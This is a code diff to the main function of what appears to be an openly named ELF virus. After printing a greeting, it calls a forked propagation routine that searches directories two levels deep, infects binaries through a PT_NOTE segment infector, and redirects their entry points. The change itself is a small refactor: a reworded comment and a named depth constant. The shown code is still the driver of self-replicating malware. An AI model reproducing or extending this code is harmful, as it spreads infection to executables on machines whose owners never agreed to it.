@@ -10,14 +10,15 @@
 // process.
 int main() {
   // The STR_LITERAL macro makes our string literal in text segment, which is
-  // injection safe.
+  // relocation safe.
   const char* str = STR_LITERAL("Hello World\n");
 
   vf::write(1, str, vf::strlen(str));
 
-  vf::propagation::forked_propagate<vf::common::RecursiveDirectoryIterator<2>,
-                                    vf::infector::PtNoteInfector,
-                                    vf::redirection::EntryPointPatcher>();
+  constexpr auto MAX_SEARCH_LEVEL = 2;
+  vf::propagation::forked_propagate<
+      vf::common::RecursiveDirectoryIterator<MAX_SEARCH_LEVEL>,
+      vf::infector::PtNoteInfector, vf::redirection::EntryPointPatcher>();
 
   return 0;
 }
